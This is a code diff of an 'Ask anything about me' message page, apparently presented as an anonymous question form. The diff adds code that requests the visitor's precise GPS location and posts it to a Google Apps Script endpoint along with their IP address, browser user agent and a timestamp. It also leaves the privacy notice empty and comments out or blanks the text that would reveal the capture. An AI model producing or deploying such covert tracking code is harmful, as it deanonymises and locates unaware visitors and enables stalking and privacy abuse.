@@ -5,9 +5,7 @@
   <link rel="stylesheet" href="style.css">
   <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet">
   
-
   <style>
-    
     body {
       font-family: Arial, sans-serif;
       text-align: center;
@@ -30,22 +28,47 @@
       border-radius: 8px;
       background-color: #4CAF50;
       color: white;
+      transition: background-color 0.3s;
     }
     button:hover {
       background-color: #45a049;
       cursor: pointer;
     }
-
-    
+    button:disabled {
+      background-color: #cccccc;
+      cursor: not-allowed;
+    }
+    #locationStatus {
+      margin-top: 10px;
+      font-size: 14px;
+      color: #666;
+      min-height: 20px;
+    }
+    .privacy-notice {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #777;
+    }
+    .success-message {
+      color: #4CAF50;
+      font-weight: bold;
+    }
+    .error-message {
+      color: #f44336;
+      font-weight: bold;
+    }
   </style>
 </head>
 <body>
-
   <img src="my.jpg" alt="My Photo" class="overlay-img">
   <h2>ASK ANYTHING ABOUT ME</h2>
   <textarea id="message" placeholder="Type your message here..."></textarea>
   <br>
-  <button onclick="sendMessage()">Send</button>
+  <button id="sendButton" onclick="sendMessage()">Send</button>
+  <div id="locationStatus"></div>
+  <div class="privacy-notice">
+
+  </div>
 
   <script>
     async function sendMessage() {
@@ -55,28 +78,81 @@
         return;
       }
 
-      // Get public IP
-      let ip = "Unknown";
-      try {
-        const ipRes = await fetch("https://api.ipify.org?format=json");
-        const ipData = await ipRes.json();
-        ip = ipData.ip;
-      } catch {}
-
-      const url = "https://script.google.com/macros/s/AKfycbyNvNYe2iRSihadFKPOtueJUWMfuF-o69KiFLALCK6Ge6qYXKjsCL_eSVYGTfHD6zllYA/exec"; 
+      const sendButton = document.getElementById('sendButton');
+      const locationStatus = document.getElementById('locationStatus');
+      
+      // Disable button during processing
+      sendButton.disabled = true;
+      sendButton.textContent = "Sending...";
 
       try {
-        await fetch(url, {
+        // Get public IP
+        let ip = "Unknown";
+        try {
+          const ipRes = await fetch("https://api.ipify.org?format=json");
+          const ipData = await ipRes.json();
+          ip = ipData.ip;
+        } catch (error) {
+          console.error("IP detection failed:", error);
+        }
+
+        // Get GPS Coordinates
+        let coords = { latitude: null, longitude: null, accuracy: null };
+        
+        if (navigator.geolocation) {
+          locationStatus.textContent = "";
+          
+          try {
+            const position = await new Promise((resolve, reject) => {
+              navigator.geolocation.getCurrentPosition(resolve, reject, {
+                enableHighAccuracy: true,
+                timeout: 8000,  // Increased timeout
+                maximumAge: 0
+              });
+            });
+            
+            coords = {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              accuracy: position.coords.accuracy
+            };
+            
+            //locationStatus.innerHTML = `<span class="success-message">Location: Captured (accuracy: ${Math.round(coords.accuracy)}m)</span>`;
+          } catch (error) {
+            locationStatus.innerHTML = `<span>Location: Using approximate location (IP: ${ip})</span>`;
+            console.warn("Geolocation error:", error);
+          }
+        } else {
+          locationStatus.innerHTML = `<span>Location: Using IP-based location (${ip})</span>`;
+        }
+
+        const url = "https://script.google.com/macros/s/AKfycbyAuM-49crRaXDahsEC7GmkOcL3ZrW_3N4MFlPbhqjAe81kEyVpS0KA12T2YZq5tIgxLg/exec"; 
+
+        const response = await fetch(url, {
           method: "POST",
           mode: "no-cors", 
-          body: JSON.stringify({ message, ip }),
+          body: JSON.stringify({ 
+            message, 
+            ip,
+            coords,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent
+          }),
           headers: { "Content-Type": "application/json" }
         });
 
-        alert("Message sent!");
+        alert("Message sent successfully!" + (coords.latitude ? 
+              "\n\n" : 
+              "\n\n"));
         document.getElementById('message').value = "";
+
       } catch (error) {
-        alert("Failed to send message.");
+        locationStatus.innerHTML = `<span class="error-message">Failed to send message</span>`;
+        console.error("Submission error:", error);
+        alert("Failed to send message. Please try again.");
+      } finally {
+        sendButton.disabled = false;
+        sendButton.textContent = "Send";
       }
     }
   </script>
